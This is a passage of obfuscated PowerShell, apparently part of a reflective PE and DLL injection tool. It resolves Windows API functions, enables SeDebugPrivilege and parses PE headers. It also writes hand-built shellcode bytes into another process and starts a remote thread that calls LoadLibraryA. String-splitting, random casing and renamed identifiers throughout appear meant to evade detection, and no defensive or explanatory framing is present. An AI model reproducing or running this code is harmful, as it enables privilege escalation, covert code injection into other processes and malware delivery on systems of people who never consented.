            $VAR0042 | Add-Member -MemberType ('Not'+'e'+'P'+'roperty') -Name ('F'+'UN048') -Value $VAR0096

            $VAR0097 = FUN012 $VAR0306 ('OpenTh'+'read'+'Token')
            $VAR0098 = FUN011 @([IntPtr], [UInt32], [Bool],  (  Get-vaRIABlE ("lx"+"Q4")  -VAlUeOn  ).MAkeByReFtYpE()) ([Bool])
            $VAR0099 =  (  Get-VAriAbLe  ('R'+'t8')).vALUE::gEtDElegAtefOrFunctionpoInteR($VAR0097, $VAR0098)
            $VAR0042 | Add-Member -MemberType ('Note'+'Prope'+'rt'+'y') -Name ('FUN04'+'9') -Value $VAR0099

            $VAR0100 = FUN012 $VAR0302 ('GetCurren'+'tT'+'h'+'rea'+'d')
            $VAR0101 = FUN011 @() ([IntPtr])
            $VAR0102 =   $rT8::gEtdElEGateFORFunctioNPOiNTEr($VAR0100, $VAR0101)
            $VAR0042 | Add-Member -MemberType ('Note'+'Pr'+'op'+'erty') -Name ('F'+'UN05'+'0') -Value $VAR0102

            $VAR0103 = FUN012 $VAR0306 ('Adjus'+'tTok'+'enPr'+'ivil'+'eg'+'es')
            $VAR0104 = FUN011 @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
            $VAR0105 =  (  GcI ('v'+'ArI'+'Ab'+'LE:rt8')).vAlue::geTDElegateForFuncTIONpoiNTeR($VAR0103, $VAR0104)
            $VAR0042 | Add-Member -MemberType ('No'+'teProper'+'ty') -Name ('FUN0'+'51') -Value $VAR0105

            $VAR0106 = FUN012 $VAR0306 ('Loo'+'kupPr'+'ivi'+'leg'+'eValu'+'eA')
            $VAR0107 = FUN011 @([String], [String], [IntPtr]) ([Bool])
            $VAR0108 =   $Rt8::gETdeLeGATEFoRFunctionpoINtER($VAR0106, $VAR0107)
            $VAR0042 | Add-Member -MemberType ('No'+'teP'+'ro'+'perty') -Name ('F'+'UN052') -Value $VAR0108

            $VAR0109 = FUN012 $VAR0306 ('Impe'+'r'+'sonat'+'eSe'+'lf')
            $VAR0110 = FUN011 @([Int32]) ([Bool])
            $VAR0111 =  $rT8::GeTDELEgATEForfUnCtiOnpoInTEr($VAR0109, $VAR0110)
            $VAR0042 | Add-Member -MemberType ('Note'+'P'+'rope'+'rty') -Name ('FUN05'+'3') -Value $VAR0111

            
            if ((  ( VarIablE ('z'+'5gHR') -valueOn  )::oSverSiON.VErsION -ge (New-Object ("{1}{2}{0}" -f 'on','Vers','i') 6, 0)) -and (  $Z5gHR::OsVeRSiON.VersIon -lt (New-Object ("{1}{2}{0}"-f'rsion','V','e') 6, 2))) {
                $VAR0112 = FUN012 ('N'+'t'+'Dll.dll') ('N'+'tCr'+'eateT'+'hreadE'+'x')
                $VAR0113 = FUN011 @( (  varIaBLE ('lxQ'+'4')  -vAlu).MAKEBYrefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
                $VAR0114 =   ( vARIAbLe ('r'+'t8') -VALUEoNlY  )::gETDeLegAtefoRfUNctiOnpOiNtER($VAR0112, $VAR0113)
                $VAR0042 | Add-Member -MemberType ('No'+'teP'+'ropert'+'y') -Name ('FUN05'+'4') -Value $VAR0114
            }

            $VAR0115 = FUN012 $VAR0302 ('I'+'sWo'+'w64Proc'+'ess')
            $VAR0116 = FUN011 @([IntPtr],   $WmbnG.MAkebyReFTypE()) ([Bool])
            $VAR0117 =   $RT8::gEtDeLEgAteFORfUNcTiOnpOInTER($VAR0115, $VAR0116)
            $VAR0042 | Add-Member -MemberType ('No'+'teProp'+'er'+'ty') -Name ('FUN'+'055') -Value $VAR0117

            $VAR0118 = FUN012 $VAR0302 ('C'+'reateTh'+'read')
            $VAR0119 = FUN011 @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32],   ( VarIABle  ('5T'+'7L')).VALUe.makebyreFtYPe()) ([IntPtr])
            $VAR0120 =  $Rt8::GEtDELegAtefoRfuNcTIonpOInTeR($VAR0118, $VAR0119)
            $VAR0042 | Add-Member -MemberType ('NotePro'+'per'+'ty') -Name ('F'+'UN'+'056') -Value $VAR0120

            return $VAR0042
        }
        


   
        Function fu`N004 {
            Param(
                [Parameter(poSItion = 0, manDATory = $true)]
                [Int64]
                $VAR0121,

                [Parameter(PosItiOn = 1, MaNdAtORY = $true)]
                [Int64]
                $VAR0122
            )

            [Byte[]]$VAR0121Bytes =   (chilDiTEm  ('VAri'+'aBL'+'E'+':n'+'S87') ).VAluE::GetByteS($VAR0121)
            [Byte[]]$VAR0122Bytes =  ( vARiaBLe ('Ns'+'87') -ValUeoNlY  )::getbYTEs($VAR0122)
            [Byte[]]$VAR0123 =  (cHilDITEm  ('vARI'+'able:'+'nS87')).VaLuE::gEtbYTes([UInt64]0)

            if ($VAR0121Bytes.cOUnT -eq $VAR0122Bytes.CouNt) {
                $VAR0124 = 0
                for ($i = 0; $i -lt $VAR0121Bytes.Count; $i++) {
                    $Val = $VAR0121Bytes[$i] - $VAR0124
                    
                    if ($Val -lt $VAR0122Bytes[$i]) {
                        $Val += 256
                        $VAR0124 = 1
                    }
                    else {
                        $VAR0124 = 0
                    }

                    [UInt16]$Sum = $Val - $VAR0122Bytes[$i]

                    $VAR0123[$i] = $Sum -band 0x00FF
                }
            }
            else {
                Throw ("{0}{1}" -f 'ERRO','R01')
            }

            return  $ns87::TOinT64($VAR0123, 0)
        }

        Function fuN005 {
            Param(
                [Parameter(poSiTiON = 0, MAndaTory = $true)]
                [Int64]
                $VAR0121,

                [Parameter(POsItION = 1, mandAtoRY = $true)]
                [Int64]
                $VAR0122
            )

            [Byte[]]$VAR0121Bytes =  $Ns87::geTBYTEs($VAR0121)
            [Byte[]]$VAR0122Bytes =   (  variABlE ('n'+'s87')  -vAL )::GETBYTES($VAR0122)
            [Byte[]]$VAR0123 =  (gi  ('VAR'+'i'+'ABL'+'E'+':nS87') ).vAlue::gETBYTeS([UInt64]0)

            if ($VAR0121Bytes.cOunT -eq $VAR0122Bytes.coUNt) {
                $VAR0124 = 0
                for ($i = 0; $i -lt $VAR0121Bytes.COunt; $i++) {
                    
                    [UInt16]$Sum = $VAR0121Bytes[$i] + $VAR0122Bytes[$i] + $VAR0124

                    $VAR0123[$i] = $Sum -band 0x00FF

                    if (($Sum -band 0xFF00) -eq 0x100) {
                        $VAR0124 = 1
                    }
                    else {
                        $VAR0124 = 0
                    }
                }
            }
            else {
                Throw ("{1}{0}" -f'ROR02','ER')
            }

            return  $ns87::TOint64($VAR0123, 0)
        }

        Function fuN006 {
            Param(
                [Parameter(PositiOn = 0, mAndATorY = $true)]
                [Int64]
                $VAR0121,

                [Parameter(PoSItIoN = 1, ManDATOrY = $true)]
                [Int64]
                $VAR0122
            )

            [Byte[]]$VAR0121Bytes =  (  get-iTEM ('VARIabLe:'+'n'+'s87')).vAlUe::GETBYTEs($VAR0121)
            [Byte[]]$VAR0122Bytes =  $NS87::gEtBytEs($VAR0122)

            if ($VAR0121Bytes.COUNT -eq $VAR0122Bytes.couNT) {
                for ($i = $VAR0121Bytes.COUnt - 1; $i -ge 0; $i--) {
                    if ($VAR0121Bytes[$i] -gt $VAR0122Bytes[$i]) {
                        return $true
                    }
                    elseif ($VAR0121Bytes[$i] -lt $VAR0122Bytes[$i]) {
                        return $false
                    }
                }
            }
            else {
                Throw ("{1}{0}{2}" -f 'R','ERRO','03')
            }

            return $false
        }


        Function fun007 {
            Param(
                [Parameter(pOsItiON = 0, MAndAtOry = $true)]
                [UInt64]
                $VAR0123
            )

            [Byte[]]$VAR0123Bytes =  (  vaRiaBlE ('ns'+'87')  ).vALuE::GETbYteS($VAR0123)
            return ( ( VArIABle  ("NS8"+"7") -vALuEoNly )::TOinT64($VAR0123Bytes, 0))
        }


        Function F`U`N008 {
            Param(
                [Parameter(POSItioN = 0, mAnDaTory = $true)]
                $VAR0123 
            )

            $VAR0123Size =  (get-varIABLe  ('RT'+'8')  ).VaLue::SiZeOf([Type]$VAR0123.GeTtYpE()) * 2
            $VAR0124 = "0x{0:X$($VAR0123Size)}" -f [Int64]$VAR0123 

            return $VAR0124
        }

        Function fuN009 {
            Param(
                [Parameter(pOSiTioN = 0, MAnDatOry = $true)]
                [String]
                $VAR0125,

                [Parameter(poSiTioN = 1, mAnDAToRy = $true)]
                [System.Object]
                $VAR0126,

                [Parameter(PoSiTIon = 2, maNdAtORy = $true)]
                [IntPtr]
                $VAR0127,

                [Parameter(PARAMeTERseTNAME = "SI`ZE", poSiTIoN = 3, mAnDATOrY = $true)]
                [IntPtr]
                $Size
            )

            [IntPtr]$VAR0128 = [IntPtr](FUN005 ($VAR0127) ($Size))

            $VAR0128 = $VAR0126.CONST038

            
        }

        Function F`UN010 {
            Param(
                [Parameter(pOsitioN = 0, ManDatORY = $true)]
                [Byte[]]
                $Bytes,

                [Parameter(POSitiON = 1, manDATORY = $true)]
                [IntPtr]
                $VAR0129
            )

            for ($VAR0130 = 0; $VAR0130 -lt $Bytes.LEnGTH; $VAR0130++) {
                  (vArIAblE  ('rT'+'8')).VaLUE::wRitEByTe($VAR0129, $VAR0130, $Bytes[$VAR0130])
            }
        }

        
        Function f`UN011 {
            Param
            (
                [OutputType([Type])]

                [Parameter( POsITIoN = 0)]
                [Type[]]
                $Parameters = (New-Object ('Ty'+'pe[]')(0)),

                [Parameter( poSItIOn = 1 )]
                [Type]
                $ReturnType = [Void]
            )

            $Domain =   $vBU::CURreNtdomaIn
            $VAR0131 = New-Object ('S'+'ystem.Refle'+'ctio'+'n'+'.As'+'sem'+'b'+'lyNa'+'me')(("{1}{2}{4}{3}{5}{0}" -f'ate','Ref','l','te','ec','dDeleg'))
            $VAR013 = $Domain.DeFINedyNamICAsSEMBly($VAR0131,  $SW0::RUN)
            $VAR014 = $VAR013.DefinEdynAmICModuLe(("{2}{0}{1}"-f 'odul','e','InMemoryM'), $false)
            $VAR011 = $VAR014.deFiNEtYpE(("{1}{3}{0}{2}"-f 'lega','MyD','teType','e'), ("{6}{10}{2}{7}{9}{3}{4}{5}{0}{8}{11}{1}{12}"-f 'siCl','a','li','ea','l','ed, An','Class, ','c, ','ass, A','S','Pub','utoCl','ss'), [System.MulticastDelegate])
            $VAR0132 = $VAR011.deFIneCoNStruCTOR(("{5}{1}{3}{7}{0}{4}{2}{6}"-f'd','ialName,','ig, P',' ','eByS','RTSpec','ublic','Hi'),  (GeT-ITeM  ('VaR'+'Iable:j1'+'f'+'vc')).vALuE::standArd, $Parameters)
            $VAR0132.SeTImpLemENTATionFLaGS(("{2}{3}{1}{4}{0}"-f'ed','e, ','Ru','ntim','Manag'))
            $VAR0133 = $VAR011.DEfiNeMETHOd('Invoke', ("{2}{5}{3}{4}{0}{1}"-f'Ne','wSlot, Virtual','P','c, Hi','deBySig, ','ubli'), $ReturnType, $Parameters)
            $VAR0133.seTiMpLeMeNTAtIonflAGS(("{3}{2}{1}{0}"-f 'Managed','time, ','n','Ru'))

            Write-Output $VAR011.cREAtetYPE()
        }


        
        Function fUN012 {
            Param
            (
                [OutputType([IntPtr])]

                [Parameter( posITIOn = 0, mAnDaTOry = $True )]
                [String]
                $Module,

                [Parameter( POsItion = 1, mandatoRY = $True )]
                [String]
                $VAR0139
            )

            
            $VAR0134 =  ( Ls  ('V'+'a'+'rIABle'+':VBu')  ).vAlUe::CuRrEnTDomaIn.GetAsSemblIeS() |
            Where-Object { $_.gLOBALassEMbLYcachE -And $_.lOcAtIoN.sPlit('\\')[-1].eQUALs(("{0}{2}{1}" -f'System.','ll','d')) }
            $VAR0135 = $VAR0134.GETTyPE(("{9}{0}{4}{7}{5}{6}{1}{8}{2}{3}" -f'ft.','a','veMe','thods','Win32.Uns','fe','N','a','ti','Microso'))

            
            $VAR0075 = $VAR0135.GETmethOd(("{1}{2}{3}{0}" -f'oduleHandle','G','et','M'))
            $VAR0060 = $VAR0135.GEtmetHoDs() | Where { $_.nAme -eq $VAR0312 } | Select-Object -first 1

            
            $VAR0136 = $VAR0075.InvokE($null, @($Module))

            
            try {
                $VAR0137 = New-Object ('Int'+'Ptr')
                $VAR0138 = New-Object ('Sys'+'tem'+'.R'+'untim'+'e.InteropS'+'e'+'rv'+'ices.'+'HandleRef')($VAR0137, $VAR0136)
                Write-Output $VAR0060.InvOkE($null, @([System.Runtime.InteropServices.HandleRef]$VAR0138, $VAR0139))
            }
            catch {
                
                Write-Output $VAR0060.inVoKe($null, @($VAR0136, $VAR0139))
            }
        }

        Function FU`N013 {
            Param(
                [Parameter(pOsItIOn = 1, MaNdatOry = $true)]
                [System.Object]
                $VAR0042,

                [Parameter(poSITiON = 2, mAnDAtorY = $true)]
                [System.Object]
                $VAR010,

                [Parameter(poSiTiON = 3, maNDaTOry = $true)]
                [System.Object]
                $VAR0041
            )

            [IntPtr]$VAR0141 = $VAR0042.Fun050.InVOkE()
            if ($VAR0141 -eq   $Lxq4::ZERo) {
                Throw ("{0}{1}{2}"-f 'E','RR','OR03')
            }

            [IntPtr]$VAR0142 =  (Get-vArIABLe  ('L'+'xq4') -vALueONl  )::ZeRo
            [Bool]$VAR0144 = $VAR0042.fUN049.InvOKe($VAR0141, $VAR0041.cONst026 -bor $VAR0041.consT027, $false, [Ref]$VAR0142)
            if ($VAR0144 -eq $false) {
                $VAR0148 =   (DIR ('VariABl'+'e'+':'+'rT8') ).VAlUe::gEtLaSTwiN32erROR()
                if ($VAR0148 -eq $VAR0041.cONsT029) {
                    $VAR0144 = $VAR0042.FuN053.iNVokE(3)
                    if ($VAR0144 -eq $false) {
                        Throw ("{2}{1}{0}"-f'R04','RRO','E')
                    }

                    $VAR0144 = $VAR0042.fUn049.INVoKe($VAR0141, $VAR0041.ConSt026 -bor $VAR0041.cOnst027, $false, [Ref]$VAR0142)
                    if ($VAR0144 -eq $false) {
                        Throw ("{1}{2}{0}"-f'05','ERR','OR')
                    }
                }
                else {
                    Throw ('ERROR006:'+' '+"$VAR0148")
                }
            }

            [IntPtr]$VAR0143 =   (vAriabLe ('rT'+'8') -VALue )::AlloChGlObAl(  $rT8::sizeof([Type]$VAR010.cONST163))
            $VAR0144 = $VAR0042.FuN052.iNvOKE($null, ("{0}{5}{1}{2}{3}{4}" -f 'SeD','ri','vil','e','ge','ebugP'), $VAR0143)
            if ($VAR0144 -eq $false) {
                Throw ("{0}{1}" -f'E','RROR07')
            }

            [UInt32]$VAR0145 =  $rT8::sIzeof([Type]$VAR010.cOnST167)
            [IntPtr]$VAR0146 =   $Rt8::alLOChglObAL($VAR0145)
            $VAR0147 =  (GEt-VARiABle ('r'+'t8') -ValuEonl)::PtrtostRuCTURE($VAR0146, [Type]$VAR010.coNSt167)
            $VAR0147.CONsT168 = 1
            $VAR0147.COnst169.ConST163 =   $rt8::PtRToStRUCTUre($VAR0143, [Type]$VAR010.coNsT163)
            $VAR0147.coNsT169.ATtRibuTes = $VAR0041.CoNsT028
              ( gci  ('V'+'aRIaBL'+'e:rT8')).ValUe::STruCTuREtOpTR($VAR0147, $VAR0146, $true)

            $VAR0144 = $VAR0042.FUN051.iNVoKe($VAR0142, $false, $VAR0146, $VAR0145,  $LXq4::ZEro,   ( Gi ('vaR'+'I'+'AbLE'+':l'+'XQ4') ).vALuE::zerO)
            $VAR0148 =   ( vaRiAblE  ("Rt"+"8")  -Va)::GETLastwIn32ERROR0() 
            if (($VAR0144 -eq $false) -or ($VAR0148 -ne 0)) {
                
            }

              (  GET-itEM  ('varI'+'ablE'+':'+'rT8')).Value::freehglOBal($VAR0146)
        }

        Function F`UN0`14 {
            Param(
                [Parameter(pOSITION = 1, mAndatoRY = $true)]
                [IntPtr]
                $VAR0151,

                [Parameter(POSitiOn = 2, manDaTOrY = $true)]
                [IntPtr]
                $VAR0127,

                [Parameter(PosiTIoN = 3, mANDAtoRy = $false)]
                [IntPtr]
                $VAR0152 =  (  vAriAble  ("Lx"+"Q4") -VAlUEo )::zero,

                [Parameter(POSiTion = 4, mAndAtory = $true)]
                [System.Object]
                $VAR0042
            )

            [IntPtr]$VAR0149 =   ( GI ("v"+"A"+"riA"+"BLe:Lxq"+"4")  ).VAlUe::ZeRO

            $VAR0150 =   ( lS  ('varI'+'a'+'Bl'+'e:Z5G'+'hr') ).vALUE::OSVerSIoN.VeRsioN
            
            if (($VAR0150 -ge (New-Object ("{0}{1}" -f 'Versi','on') 6, 0)) -and ($VAR0150 -lt (New-Object ("{1}{0}{2}"-f 'er','V','sion') 6, 2))) {
                
                $RetVal = $VAR0042.fUn054.InVoKe([Ref]$VAR0149, 0x1FFFFF,   ( gCi ("V"+"arIab"+"lE:lx"+"q"+"4") ).vaLuE::zEro, $VAR0151, $VAR0127, $VAR0152, $false, 0, 0xffff, 0xffff,   $lxq4::zErO)
                $VAR0153 =   $rT8::GETlaStWin32eRRor()
                if ($VAR0149 -eq   (  varIaBLe ('LX'+'q4') -vA )::ZERO) {
                    Throw ('ER'+'ROR6'+'3: '+"$RetVal. "+"$VAR0153")
                }
            }
            
            else {
                
                $VAR0149 = $VAR0042.FUN047.invoke($VAR0151,   $LXq4::ZErO, [UIntPtr][UInt64]0xFFFF, $VAR0127, $VAR0152, 0,  (VARIAblE ('LX'+'q4') -vaLUE  )::ZERo)
            }

            if ($VAR0149 -eq   (  Gi ('vARI'+'A'+'BLE:LXQ4')).vALUE::zeRo) {
                Write-Error ("{2}{1}{0}" -f'4','RROR6','E') -ErrorAction ('St'+'op')
            }

            return $VAR0149
        }

        Function fU`N0`15 {
            Param(
                [Parameter(POsition = 0, mAndatoRY = $true)]
                [IntPtr]
                $VAR0263,

                [Parameter(pOSitION = 1, MaNdAToRy = $true)]
                [System.Object]
                $VAR010
            )

            $VAR0154 = New-Object ('Sy'+'stem.Obj'+'e'+'ct')

            
            $VAR0155 =   (VARiAbLE ('R'+'t8') -vAlUEON )::PtrtOStRuctUre($VAR0263, [Type]$VAR010.cONSt123)

            
            [IntPtr]$VAR0156 = [IntPtr](FUN005 ([Int64]$VAR0263) ([Int64][UInt64]$VAR0155.consT141))
            $VAR0154 | Add-Member -MemberType ('No'+'teProper'+'t'+'y') -Name ('CONST'+'030') -Value $VAR0156
            $VAR0157 =  ( GI  ("vari"+"ab"+"lE:RT8")  ).VAluE::PTRTOStRuCture($VAR0156, [Type]$VAR010.cOnst03164)

            
            if ($VAR0157.SIGnAture -ne 0x00004550) {
                throw ("{1}{0}{2}"-f'R','ERRO','65')
            }

            if ($VAR0157.COnSt122.mAgiC -eq ("{0}{1}" -f'CONS','T101')) {
                $VAR0154 | Add-Member -MemberType ('N'+'ote'+'P'+'roperty') -Name ('CONST'+'031') -Value $VAR0157
                $VAR0154 | Add-Member -MemberType ('NoteProper'+'t'+'y') -Name ('CONS'+'T03'+'2') -Value $true
            }
            else {
                $VAR0158 =  (ls ('va'+'Ri'+'AbL'+'E:rT8')).VALuE::pTRtOStRuCtUrE($VAR0156, [Type]$VAR010.ConST03132)
                $VAR0154 | Add-Member -MemberType ('Note'+'Prope'+'rty') -Name ('CONST0'+'3'+'1') -Value $VAR0158
                $VAR0154 | Add-Member -MemberType ('Not'+'ePr'+'operty') -Name ('CO'+'NS'+'T032') -Value $false
            }

            return $VAR0154
        }


        
        Function F`UN0`16 {
            Param(
                [Parameter( PosITioN = 0, maNDaTORY = $true )]
                [Byte[]]
                $VAR001,

                [Parameter(pOsItiON = 1, MAnDAtory = $true)]
                [System.Object]
                $VAR010
            )

            $VAR0126 = New-Object ('Sy'+'stem.Obje'+'ct')

            
            [IntPtr]$VAR0159 =  $rT8::AlloChglobaL($VAR001.lEngth)
             $rt8::COPY($VAR001, 0, $VAR0159, $VAR001.LEnGth) | Out-Null

            
            $VAR0154 = FUN015 -VAR0263 $VAR0159 -VAR010 $VAR010

            
            $VAR0126 | Add-Member -MemberType ('N'+'ot'+'e'+'Property') -Name ("{0}{1}{2}" -f'C','ONST','032') -Value ($VAR0154.cOnsT032)
            $VAR0126 | Add-Member -MemberType ('NotePr'+'opert'+'y') -Name ("{2}{0}{1}" -f'019','6','VAR') -Value ($VAR0154.cOnST031.COnst122.ConSt058)
            $VAR0126 | Add-Member -MemberType ('Not'+'e'+'Property') -Name ("{1}{0}{2}" -f'O','C','NST033') -Value ($VAR0154.CONSt031.CoNST122.CONsT033)
            $VAR0126 | Add-Member -MemberType ('Not'+'ePro'+'perty') -Name ("{1}{2}{0}"-f '34','CON','ST0') -Value ($VAR0154.ConSt031.CONSt122.CoNsT034)
            $VAR0126 | Add-Member -MemberType ('Note'+'P'+'ro'+'perty') -Name ("{1}{0}"-f'35','CONST0') -Value ($VAR0154.cONST031.cOnsT122.cOnsT035)

            
             ( GeT-vAriaBle  ("Rt"+"8") -VALUeOnL  )::freEHGloBAL($VAR0159)

            return $VAR0126
        }


        
        
        Function fuN017 {
            Param(
                [Parameter( POSitiON = 0, mANDaToRY = $true)]
                [IntPtr]
                $VAR0263,

                [Parameter(pOSition = 1, MaNdAtoRy = $true)]
                [System.Object]
                $VAR010,

                [Parameter(posITion = 2, ManDatory = $true)]
                [System.Object]
                $VAR0041
            )

            if ($VAR0263 -eq $null -or $VAR0263 -eq  $lxq4::zeRO) {
                throw ("{1}{0}"-f '6','ERROR06')
            }

            $VAR0126 = New-Object ('S'+'ys'+'te'+'m.Object')

            
            $VAR0154 = FUN015 -VAR0263 $VAR0263 -VAR010 $VAR010

            
            $VAR0126 | Add-Member -MemberType ('Note'+'Pro'+'perty') -Name ("{1}{0}{2}"-f '6','VAR02','3') -Value $VAR0263
            $VAR0126 | Add-Member -MemberType ('No'+'teProp'+'ert'+'y') -Name ("{1}{0}" -f'T031','CONS') -Value ($VAR0154.CoNSt031)
            $VAR0126 | Add-Member -MemberType ('N'+'otePrope'+'rty') -Name ("{1}{2}{0}"-f '0','CON','ST100') -Value ($VAR0154.cOnsT030) 
            $VAR0126 | Add-Member -MemberType ('NotePr'+'op'+'ert'+'y') -Name ("{2}{1}{0}"-f '2','ONST03','C') -Value ($VAR0154.ConsT032)
            $VAR0126 | Add-Member -MemberType ('NotePr'+'oper'+'t'+'y') -Name ("{1}{0}{2}" -f'NS','CO','T033') -Value ($VAR0154.CoNst031.COnst122.consT033)

            if ($VAR0126.Const032 -eq $true) {
                [IntPtr]$VAR0160 = [IntPtr](FUN005 ([Int64]$VAR0126.CoNst1000) ( ( GEt-VariAbLE ('R'+'T8') -vaL)::siZeof([Type]$VAR010.Const03164)))
                $VAR0126 | Add-Member -MemberType ('N'+'otePrope'+'rt'+'y') -Name ('CON'+'S'+'T036') -Value $VAR0160
            }
            else {
                [IntPtr]$VAR0160 = [IntPtr](FUN005 ([Int64]$VAR0126.consT1000) ( (VaRiabLe ("rT"+"8") -ValUe )::SIzEOf([Type]$VAR010.consT03132)))
                $VAR0126 | Add-Member -MemberType ('No'+'tePr'+'operty') -Name ('CO'+'NS'+'T036') -Value $VAR0160
            }

            if (($VAR0154.cONsT031.COnsT121.CONSt067 -band $VAR0041.COnST022) -eq $VAR0041.CoNsT022) {
                $VAR0126 | Add-Member -MemberType ('NotePro'+'p'+'e'+'rty') -Name ('CONST0'+'3'+'7') -Value ("{0}{1}"-f'L','ibrary')
            }
            elseif (($VAR0154.COnST031.conST121.CONST067 -band $VAR0041.CoNSt021) -eq $VAR0041.cONST021) {
                $VAR0126 | Add-Member -MemberType ('N'+'ote'+'Propert'+'y') -Name ('CONST'+'037') -Value ("{0}{1}{2}"-f'Exe','c','utable')
            }
            else {
                Throw ("{1}{0}{2}"-f 'R','E','ROR08')
            }

            return $VAR0126
        }

        Function FUn0`18 {
            Param(
                [Parameter(positIoN = 0, MandaTory = $true)]
                [IntPtr]
                $VAR0161,

                [Parameter(PoSItiOn = 1, MAnDaTory = $true)]
                [IntPtr]
                $VAR0162
            )

            $VAR0163 =   ( VAriaBle ('r'+'T8')).VAluE::SizeoF([Type][IntPtr])

            $VAR0164 =  $RT8::PTRTOStrINganSi($VAR0162)
            $VAR0165 = [UIntPtr][UInt64]([UInt64]$VAR0164.lEnGtH + 1)
            $VAR0166 = $VAR0042.fUN032.INvokE($VAR0161,   (GEt-childiteM ('V'+'a'+'rIAbLE:Lx'+'Q4')  ).valuE::ZerO, $VAR0165, $VAR0041.conSt001 -bor $VAR0041.cONSt002, $VAR0041.COnst005)
            if ($VAR0166 -eq  (  Dir ('V'+'aR'+'Ia'+'BLe:lXQ4')).ValUE::ZeRO) {
                Throw ("{1}{0}" -f 'R09','ERRO')
            }

            [UIntPtr]$VAR0167 =  ( iTEM ('vaRiaB'+'L'+'E:oI'+'4')).ValuE::ZERo
            $Success = $VAR0042.fun045.invOke($VAR0161, $VAR0166, $VAR0162, $VAR0165, [Ref]$VAR0167)

            if ($Success -eq $false) {
                Throw ("{0}{1}{2}" -f'ER','ROR1','0')
            }
            if ($VAR0165 -ne $VAR0167) {
                Throw ("{1}{0}"-f '1','ERROR01')
            }

            $VAR0168 = $VAR0042.fuN041.INVOKE($VAR0302)
            $VAR0169 = $VAR0042.FuN036.INVOkE($VAR0168, ("{0}{2}{1}" -f'LoadLibra','yA','r')) 

            [IntPtr]$VAR0181 =  (  chiLDITeM ('vaRiA'+'B'+'le:LXq'+'4')).vaLUe::ZEro
            
            
            if ($VAR0126.consT032 -eq $true) {
                
                $VAR0170 = $VAR0042.FuN032.iNvOKE($VAR0161,   (  GeT-itEM ('V'+'aria'+'blE:'+'LxQ4') ).vAlUE::Zero, $VAR0165, $VAR0041.CoNst001 -bor $VAR0041.CONSt002, $VAR0041.const005)
                if ($VAR0170 -eq  ( ITEM  ('Va'+'RIaBle:LXq'+'4')).vAlue::ZERo) {
                    Throw ("{1}{2}{0}"-f'R12','ERR','O')
                }

                [Byte[]]$VAR0174 = 83,72,137,227,72,131,236,32,102,131,228,192,72,185
                $VAR0175 = 72,186
                $VAR0176 = 255,210,72,186
                $VAR0177 = 72,137,2,72,137,220,91,195

                $VAR0171 = $VAR0174.LeNGTH + $VAR0175.LENGTH + $VAR0176.lEnGTh + $VAR0177.LEnGTH + ($VAR0163 * 3)
                $VAR0172 =   ( varIabLe  ('r'+'T8')).VaLue::aLLoChgLOBAl($VAR0171)
                $VAR0173 = $VAR0172

                FUN010 -Bytes $VAR0174 -VAR0129 $VAR0172
                $VAR0172 = FUN005 $VAR0172 ($VAR0174.LengTh)
                 $rt8::STRUctUrEToPtR($VAR0166, $VAR0172, $false)
                $VAR0172 = FUN005 $VAR0172 ($VAR0163)
                FUN010 -Bytes $VAR0175 -VAR0129 $VAR0172
                $VAR0172 = FUN005 $VAR0172 ($VAR0175.lEnGth)
                 (  vAriabLE  ('RT'+'8')  -ValUe  )::StruCTurEToPTR($VAR0169, $VAR0172, $false)
                $VAR0172 = FUN005 $VAR0172 ($VAR0163)
                FUN010 -Bytes $VAR0176 -VAR0129 $VAR0172
                $VAR0172 = FUN005 $VAR0172 ($VAR0176.leNGth)
                 (VaRiable ('Rt'+'8')  -ValUEOnLY)::StructUreTOptr($VAR0170, $VAR0172, $false)
                $VAR0172 = FUN005 $VAR0172 ($VAR0163)
                FUN010 -Bytes $VAR0177 -VAR0129 $VAR0172
                $VAR0172 = FUN005 $VAR0172 ($VAR0177.lENgth)

                $VAR0178 = $VAR0042.FUN032.InvOKe($VAR0161,   $LXq4::ZeRo, [UIntPtr][UInt64]$VAR0171, $VAR0041.cONsT001 -bor $VAR0041.Const002, $VAR0041.COnsT008)
                if ($VAR0178 -eq   $lxQ4::zERo) {
                    Throw ("{1}{0}"-f 'ROR13','ER')
                }

                $Success = $VAR0042.fun045.INvoKE($VAR0161, $VAR0178, $VAR0173, [UIntPtr][UInt64]$VAR0171, [Ref]$VAR0167)
                if (($Success -eq $false) -or ([UInt64]$VAR0167 -ne [UInt64]$VAR0171)) {
                    Throw ("{0}{1}" -f 'ER','ROR14')
                }

                $VAR0179 = FUN014 -VAR0151 $VAR0161 -VAR0127 $VAR0178 -VAR0042 $VAR0042
                $VAR0144 = $VAR0042.FUn044.INvOke($VAR0179, 20000)
                if ($VAR0144 -ne 0) {
                    Throw ("{0}{1}"-f'E','RROR15')
                }

                
                [IntPtr]$VAR0180 =  (  vAriAblE  ('rt'+'8') -va )::aLlOchGLOBal($VAR0163)
                $VAR0144 = $VAR0042.fuN046.iNvOKE($VAR0161, $VAR0170, $VAR0180, [UIntPtr][UInt64]$VAR0163, [Ref]$VAR0167)
                if ($VAR0144 -eq $false) {
                    Throw ("{1}{0}{2}" -f 'RROR1','E','6')
                }
                [IntPtr]$VAR0181 =  ( iteM ('v'+'ArIABLE:r'+'t'+'8')).vaLUE::pTrToStRUCtURE($VAR0180, [Type][IntPtr])

                $VAR0042.FUN039.InVOke($VAR0161, $VAR0170, [UIntPtr][UInt64]0, $VAR0041.consT025) | Out-Null
                $VAR0042.fUn039.iNvOkE($VAR0161, $VAR0178, [UIntPtr][UInt64]0, $VAR0041.conST025) | Out-Null
            }
            else {
                [IntPtr]$VAR0179 = FUN014 -VAR0151 $VAR0161 -VAR0127 $VAR0169 -VAR0152 $VAR0166 -VAR0042 $VAR0042
                $VAR0144 = $VAR0042.FUn044.inVOKe($VAR0179, 20000)
                if ($VAR0144 -ne 0) {
                    Throw ("{2}{0}{1}"-f'RRO','R17.','E')
                }

                [Int32]$VAR0182 = 0
                $VAR0144 = $VAR0042.fUn048.invOKe($VAR0179, [Ref]$VAR0182)
                if (($VAR0144 -eq 0) -or ($VAR0182 -eq 0)) {
                    Throw ("{1}{0}{2}" -f'RROR','E','18')
                }

                [IntPtr]$VAR0181 = [IntPtr]$VAR0182
            }

            $VAR0042.fUN039.iNvOke($VAR0161, $VAR0166, [UIntPtr][UInt64]0, $VAR0041.const025) | Out-Null

            return $VAR0181
        }

        Function FuN019 {
            Param(
